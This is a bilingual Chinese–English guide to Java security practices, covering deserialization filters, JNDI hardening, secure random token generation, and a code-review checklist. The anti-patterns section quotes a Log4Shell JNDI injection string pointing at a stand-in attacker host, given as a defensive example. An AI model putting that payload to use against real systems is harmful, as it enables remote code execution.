# Java 安全性防護與常見漏洞 / Java Security Practices and Common Vulnerabilities

## Mental model｜心智模型

在 Java 生態系中，安全性的核心心智模型是**「資料零信任，執行顯式意圖」 (Zero Trust in Data, Explicit Intent in Execution)**。
In the Java ecosystem, the core mental model for security is **"Zero Trust in Data, Explicit Intent in Execution."**

Java 提供了許多強大但具備高度動態性的功能，例如反射 (Reflection)、原生序列化 (Native Serialization) 與 JNDI (Java Naming and Directory Interface)。這些機制的危險之處在於：**它們模糊了「資料」與「程式碼」的界線**。當攻擊者能夠控制輸入這些機制的資料時，他們實質上就能控制 JVM 的執行流程（例如觸發遠端程式碼執行 RCE）。
Java provides powerful but highly dynamic features like Reflection, Native Serialization, and JNDI. The danger of these mechanisms is that **they blur the line between "data" and "code."** When an attacker can control the data fed into these mechanisms, they essentially control the JVM's execution flow (e.g., triggering Remote Code Execution, RCE).

- **反序列化不是單純的資料解析 (Deserialization is not just data parsing)**：它會在記憶體中實例化物件，並可能在類型檢查完成前觸發危險的 `readObject` 邏輯。
- **JNDI 不是單純的查表 (JNDI is not just a lookup)**：它可以被指示去遠端伺服器下載並執行未知的 `.class` 檔案。
- **隨機不等於安全 (Random does not mean secure)**：常規的隨機數生成器是可預測的數學公式，無法抵抗密碼學攻擊。

---

## Patterns & best practices｜常見模式與最佳實務

### 1. 徹底防禦反序列化漏洞 / Comprehensive Defense Against Deserialization
**最佳實務：** 盡可能棄用 Java 原生序列化 (`java.io.Serializable`)，改用 JSON (如 Jackson, Gson) 或 Protobuf 等純資料格式。如果必須使用原生序列化，**絕對要實作 JEP 290 的 `ObjectInputFilter`** 來建立白名單。
**Best Practice:** Abandon Java native serialization (`java.io.Serializable`) whenever possible in favor of pure data formats like JSON (Jackson, Gson) or Protobuf. If native serialization is unavoidable, **you must implement JEP 290's `ObjectInputFilter`** to establish an allowlist.

### 2. 封印 JNDI 與動態類別載入 / Sealing JNDI and Dynamic Class Loading
**最佳實務：** 現代 Java 版本（8u191, 11.0.1+）預設已關閉 JNDI 遠端類別載入。但在維護舊系統或使用依賴庫時，應確保 `com.sun.jndi.ldap.object.trustURLCodebase` 與 `com.sun.jndi.rmi.object.trustURLCodebase` 設為 `false`。對於日誌系統（如 Log4j），確保關閉訊息查找功能（Message Lookups）。
**Best Practice:** Modern Java versions (8u191, 11.0.1+) disable JNDI remote class loading by default. However, when maintaining legacy systems or using dependencies, ensure `com.sun.jndi.ldap.object.trustURLCodebase` and `com.sun.jndi.rmi.object.trustURLCodebase` are set to `false`. For logging frameworks (like Log4j), ensure message lookups are disabled.

### 3. 正確使用密碼學安全的隨機數 / Correct Usage of Cryptographically Secure Random Numbers
**最佳實務：** 產生密碼、Session Token、加密金鑰時，一律使用 `java.security.SecureRandom`。在 Linux 環境下，了解 `/dev/random`（可能阻塞）與 `/dev/urandom`（非阻塞，通常已足夠安全）的差異。
**Best Practice:** Always use `java.security.SecureRandom` when generating passwords, session tokens, or cryptographic keys. On Linux environments, understand the difference between `/dev/random` (can block) and `/dev/urandom` (non-blocking, usually secure enough).

---

## Anti-patterns & pitfalls｜反模式與踩雷點

### ❌ Anti-pattern 1: 使用 `java.util.Random` 產生安全憑證 / Using `java.util.Random` for security credentials
`Random` 類別使用的是線性同餘生成器 (LCG)。只要攻擊者觀察到連續的幾個輸出，就能輕易反推種子 (Seed) 並預測未來的所有的隨機數。
The `Random` class uses a Linear Congruential Generator (LCG). If an attacker observes a few consecutive outputs, they can easily reverse-engineer the seed and predict all future random numbers.
**Consequence:** Session 劫持、密碼重置 Token 被猜測。 / Session hijacking, password reset tokens being guessed.

### ❌ Anti-pattern 2: 盲目信任 `SecureRandom.getInstanceStrong()` / Blindly trusting `SecureRandom.getInstanceStrong()`
這個方法會返回當前平台上最強的隨機數演算法。在 Linux 上，它通常指向 `/dev/random`。如果系統的熵池 (Entropy pool) 耗盡，呼叫這個方法的執行緒將會**無限期阻塞 (Block)**，導致應用程式卡死。
This method returns the strongest algorithm on the platform. On Linux, it usually points to `/dev/random`. If the system's entropy pool is depleted, threads calling this method will **block indefinitely**, causing the application to freeze.
**Fix:** 對於大多數 Web 應用，直接使用 `new SecureRandom()`（預設使用 `/dev/urandom`）已經足夠安全且不會阻塞。 / For most web apps, simply using `new SecureRandom()` (defaults to `/dev/urandom`) is secure enough and non-blocking.

### ❌ Anti-pattern 3: 將未淨化的使用者輸入直接寫入日誌 / Logging unsanitized user input directly
這正是 Log4Shell (CVE-2021-44228) 爆發的根本原因。當日誌框架具備字串插值 (String Interpolation) 功能時，記錄 `${jndi:ldap://attacker.com/Exploit}` 會直接觸發漏洞。
This is the root cause of the Log4Shell (CVE-2021-44228) outbreak. When a logging framework supports string interpolation, logging `${jndi:ldap://attacker.com/Exploit}` triggers the vulnerability directly.
**Fix:** 保持依賴庫更新，並在架構層面限制容器的對外 Egress 網路連線。 / Keep dependencies updated and restrict outbound (egress) network connections from containers at the architecture level.

---

## Checklists & workflows｜檢查清單與流程

在進行架構設計或 Code Review 時，請驗證以下項目：
When designing architecture or conducting Code Reviews, verify the following:

- [ ] **Dependency Scanning:** 是否已整合 OWASP Dependency-Check 或 Snyk 到 CI/CD 流程中，自動阻擋帶有已知 CVE 的套件？ / Is OWASP Dependency-Check or Snyk integrated into the CI/CD pipeline to automatically block packages with known CVEs?
- [ ] **Serialization Check:** 專案中是否使用了 `ObjectInputStream`？如果是，是否已經實作了 `ObjectInputFilter` 白名單？ / Is `ObjectInputStream` used in the project? If so, is an `ObjectInputFilter` allowlist implemented?
- [ ] **Randomness Check:** 搜尋程式碼庫，確保所有涉及 Token、密碼、金鑰生成的邏輯都沒有使用 `Math.random()` 或 `java.util.Random`。 / Search the codebase to ensure no token, password, or key generation logic uses `Math.random()` or `java.util.Random`.
- [ ] **Egress Network Policy:** 生產環境的 JVM 容器是否限制了對外的網路連線？（即使發生 JNDI 注入，若無法連線到攻擊者的 LDAP 伺服器，也能阻斷 RCE）。 / Does the production JVM container restrict outbound network connections? (Even if JNDI injection occurs, blocking connection to the attacker's LDAP server prevents RCE).
- [ ] **JSON Deserialization:** 如果使用 Jackson，是否避免了全域開啟 `enableDefaultTyping()`？（這會導致類似原生序列化的多型反序列化漏洞）。 / If using Jackson, is global `enableDefaultTyping()` avoided? (This leads to polymorphic deserialization vulnerabilities similar to native serialization).

---

## Real-world examples｜實戰案例

### 實戰案例 1：安全的 Session Token 生成 / Safe Session Token Generation

不要使用 UUID (特別是 v4 之前的版本) 作為高安全性的 Session ID，應使用 `SecureRandom` 搭配 Base64。
Do not use UUIDs (especially pre-v4) for high-security Session IDs. Use `SecureRandom` with Base64 encoding.

```java
import java.security.SecureRandom;
import java.util.Base64;

public class TokenGenerator {
    // 實例化 SecureRandom 是昂貴的，應作為 static final 重複使用
    // Instantiating SecureRandom is expensive; reuse it as static final
    private static final SecureRandom SECURE_RANDOM = new SecureRandom();
    
    // Base64 URL Safe Encoder，不帶 padding (=)
    // Base64 URL Safe Encoder without padding (=)
    private static final Base64.Encoder BASE64_ENCODER = Base64.getUrlEncoder().withoutPadding();

    public static String generateSecureToken() {
        // 產生 32 bytes (256 bits) 的隨機數，足以抵抗暴力破解
        // Generate 32 bytes (256 bits) of randomness, sufficient against brute-force
        byte[] randomBytes = new byte[32];
        SECURE_RANDOM.nextBytes(randomBytes);
        
        return BASE64_ENCODER.encodeToString(randomBytes);
    }
}
```

### 實戰案例 2：使用 JEP 290 防禦反序列化 / Defending Deserialization with JEP 290

如果必須讀取舊系統傳來的 Java 序列化位元組，必須在 `readObject` 之前套用過濾器。
If you must read Java serialized bytes from a legacy system, you must apply a filter before `readObject`.

```java
import java.io.*;

public class SafeDeserialization {

    public static Object deserializeSafely(byte[] data) throws IOException, ClassNotFoundException {
        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
             ObjectInputStream ois = new ObjectInputStream(bais)) {

            // 建立白名單過濾器：只允許 java.lang.String 和 com.mycompany.dto.*
            // 拒絕其他所有類別，並限制陣列大小與圖層深度
            // Create an allowlist filter: only allow java.lang.String and com.mycompany.dto.*
            // Reject everything else, and limit array size and graph depth
            ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
                "java.lang.String;" +
                "com.mycompany.dto.*;" +
                "!*;" + // 拒絕其他所有 (Reject all others)
                "maxarray=10000;maxdepth=10" // 限制資源消耗防禦 DoS (Limit resources to prevent DoS)
            );
            
            // 將過濾器綁定到此 ObjectInputStream
            // Bind the filter to this ObjectInputStream
            ois.setObjectInputFilter(filter);

            // 只有通過過濾器的類別才會被實例化
            // Only classes that pass the filter will be instantiated
            return ois.readObject();
        }
    }
}
```